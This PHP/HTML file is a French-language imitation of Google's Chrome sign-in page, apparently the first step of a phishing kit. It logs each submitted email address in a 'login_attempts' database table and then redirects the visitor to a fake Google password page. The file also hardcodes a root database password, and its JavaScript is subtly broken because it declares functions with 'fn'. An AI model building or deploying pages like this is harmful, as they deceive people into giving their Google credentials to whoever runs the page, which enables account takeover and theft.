<?php
// --- CONFIGURATION DE LA BASE DE DONNÉES ---
$host     = '127.0.0.1'; // Connexion locale sécurisée
$dbname   = 'tracking_db';
$username = 'root';
$password = 'pwd';      // Le mot de passe que vous avez configuré

try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8mb4", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Erreur : " . $e->getMessage());
}

// --- TRAITEMENT DU FORMULAIRE ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = filter_input(INPUT_POST, 'email', FILTER_SANITIZE_EMAIL);

    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $stmt = $pdo->prepare("INSERT INTO login_attempts (email) VALUES (:email)");
        $stmt->execute([':email' => $email]);
        
        // Redirection vers la page du mot de passe après l'enregistrement réussi
        // Remplacez la ligne existante par celle-ci :
        header("Location: /google-password.php?email=" . urlencode($email));
        exit();
    }
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Se connecter à Chrome</title>
    
    <script src="https://cdn.tailwindcss.com"></script>
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
        
        body {
            font-family: 'Roboto', sans-serif;
            -webkit-font-smoothing: antialiased;
        }

        /* --- ANIMATION GOOGLE : LABEL DANS LA BORDURE --- */
        .relative-input { position: relative; margin-top: 8px; }

        .google-input {
            width: 100%;
            height: 56px;
            border: 1px solid #747775;
            border-radius: 4px;
            padding: 13px 15px;
            font-size: 16px;
            background: transparent;
            outline: none;
            transition: border 0.2s;
        }

        .google-input:focus {
            border: 2px solid #0b57d0;
            padding: 12px 14px;
        }

        .google-input.input-error {
            border: 2px solid #b3261e;
        }

        .google-label {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            background-color: transparent;
            color: #444746;
            font-size: 16px;
            padding: 0 4px;
            transition: all 0.2s ease;
            pointer-events: none;
            z-index: 10;
        }

        .google-input:focus ~ .google-label,
        .google-input:not(:placeholder-shown) ~ .google-label {
            top: 0;
            font-size: 12px;
            color: #0b57d0;
            background-color: white;
        }

        .google-input.input-error ~ .google-label {
            color: #b3261e;
        }

        .lang-selector:focus {
            outline: 2px solid #0b57d0;
            outline-offset: 2px;
            border-radius: 4px;
        }
        
        #lang-menu { display: none; }
        #lang-menu.show { display: block; }
    </style>
</head>
<body class="min-h-screen bg-[#f0f4f9] flex flex-col items-center justify-center text-[#1f1f1f] p-4">
    
    <div class="bg-white rounded-[28px] w-full max-w-[1040px] flex flex-col md:flex-row gap-8 p-8 md:p-[48px] shadow-sm">
        
        <div class="flex-1 flex flex-col text-left">
            <img 
                src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" 
                alt="Logo Google" 
                class="h-[36px] w-[36px] mb-8 object-contain self-start" 
            />
            <h1 id="txt-title" class="text-[36px] font-normal leading-tight mb-4 tracking-[-0.5px]">
                Se connecter à Chrome
            </h1>
            <p id="txt-desc" class="text-[16px] font-normal text-[#1f1f1f] leading-[24px]">
                Connectez-vous avec votre compte Google pour bénéficier de vos favoris, vos mots de passe, votre historique et d'autres paramètres sur tous vos appareils
            </p>
        </div>

        <div class="flex-1 flex flex-col pt-4 md:pt-[60px]">
            
            <form id="loginForm" method="POST" action="index.php" class="flex flex-col h-full" novalidate>
                <div class="relative-input mb-2">
                    <input 
                        type="text" 
                        id="email"
                        name="email"
                        class="google-input"
                        placeholder=" "
                    />
                    <label for="email" id="txt-label" class="google-label">
                        Adresse e-mail ou téléphone
                    </label>
                </div>
                
                <div id="error-container" class="hidden flex items-center gap-1.5 mb-2 mt-1 text-[#b3261e]">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
                    <span class="text-[12px]">Entrez une adresse de courriel ou un numéro de téléphone</span>
                </div>
            
                <div class="mb-[40px]">
                    <button type="button" id="txt-forgot" class="text-[#0b57d0] font-medium text-[14px] hover:underline px-2 py-1.5 -ml-2 rounded-md outline-none bg-transparent border-none cursor-pointer">
                        Adresse e-mail oubliée ?
                    </button>
                </div>

                <div class="text-[14px] text-[#444746] mb-[40px] leading-[20px]">
                    <span id="txt-guest">Ce n'est pas votre ordinateur ? Utilisez le mode Invité pour vous connecter en mode privé.</span>
                    <a href="https://support.google.com/chrome/answer/6130773?hl=fr" id="txt-more" class="text-[#0b57d0] font-medium hover:underline ml-1">En savoir plus sur l'utilisation du mode Invité</a>
                </div>

                <div class="flex flex-row justify-end items-center gap-2 mt-auto">
                    <button type="button" id="txt-create" class="text-[#0b57d0] font-medium text-[14px] px-6 py-2.5 hover:bg-[#f0f4f9] rounded-full outline-none">Créer un compte</button>
                    <button type="submit" id="txt-next" class="bg-[#0b57d0] text-white font-medium text-[14px] px-6 py-2.5 rounded-full hover:bg-[#0a4bbb] outline-none">Suivant</button>
                </div>
            </form>
        </div>
    </div>

    <div class="w-full max-w-[1040px] flex justify-between items-center text-[12px] text-[#444746] px-2 mt-4 relative">
        <div class="relative">
            <button onclick="toggleLang()" class="lang-selector flex items-center gap-2 px-3 py-2 hover:bg-black/5 rounded cursor-pointer border-none bg-transparent outline-none">
                <span id="current-lang">Français (France)</span> ▼
            </button>
            <div id="lang-menu" class="absolute bottom-full left-0 mb-2 bg-white shadow-lg border rounded py-2 w-[180px] z-50">
                <div class="px-4 py-2 hover:bg-gray-100 cursor-pointer" onclick="changeLang('fr', 'Français (France)')">Français (France)</div>
                <div class="px-4 py-2 hover:bg-gray-100 cursor-pointer" onclick="changeLang('en', 'English (US)')">English (US)</div>
            </div>
        </div>
        
        <div class="flex gap-4">
            <a href="https://support.google.com/accounts?hl=fr&visit_id=639120645873149951-602396872&rd=2&p=account_iph#topic=3382296" id="txt-help" class="hover:bg-black/5 px-3 py-2 rounded no-underline text-inherit">Aide</a>
            <a href="https://policies.google.com/privacy?gl=FR&hl=fr" id="txt-priv" class="hover:bg-black/5 px-3 py-2 rounded no-underline text-inherit">Confidentialité</a>
            <a href="https://policies.google.com/terms?gl=FR&hl=fr" id="txt-terms" class="hover:bg-black/5 px-3 py-2 rounded no-underline text-inherit">Conditions</a>
        </div>
    </div>

    <script>
        // Logique de validation et soumission
        const form = document.getElementById('loginForm');
        const input = document.getElementById('email');
        const error = document.getElementById('error-container');

        form.addEventListener('submit', (e) => {
            if (input.value.trim() === '') {
                e.preventDefault(); // Bloque l'envoi uniquement si le champ est vide
                input.classList.add('input-error');
                error.classList.remove('hidden');
            } else {
                // Sauvegarde locale avant le rechargement/l'envoi
                sessionStorage.setItem('google_email', input.value.trim());
                // L'envoi se fait normalement vers index.php pour l'insertion SQL
            }
        });

        input.addEventListener('input', () => {
            input.classList.remove('input-error');
            error.classList.add('hidden');
        });

        // Traduction
        const translations = {
            fr: { title: "Se connecter à Chrome", label: "Adresse e-mail ou téléphone", forgot: "Adresse e-mail oubliée ?", guest: "Ce n'est pas votre ordinateur ? Utilisez le mode Invité pour vous connecter en mode privé.", next: "Suivant", help: "Aide", priv: "Confidentialité", terms: "Conditions", more: "En savoir plus" },
            en: { title: "Sign in to Chrome", label: "Email or phone", forgot: "Forgot email?", guest: "Not your computer? Use Guest mode to sign in privately.", next: "Next", help: "Help", priv: "Privacy", terms: "Terms", more: "Learn more" }
        };

        fn toggleLang() { document.getElementById('lang-menu').classList.toggle('show'); }

        fn changeLang(lang, label) {
            const t = translations[lang];
            document.getElementById('txt-title').innerText = t.title;
            document.getElementById('txt-label').innerText = t.label;
            document.getElementById('txt-forgot').innerText = t.forgot;
            document.getElementById('txt-guest').innerText = t.guest;
            document.getElementById('txt-next').innerText = t.next;
            document.getElementById('txt-help').innerText = t.help;
            document.getElementById('txt-priv').innerText = t.priv;
            document.getElementById('txt-terms').innerText = t.terms;
            document.getElementById('txt-more').innerText = t.more;
            document.getElementById('current-lang').innerText = label;
            toggleLang();
        }
    </script>

</body>
</html>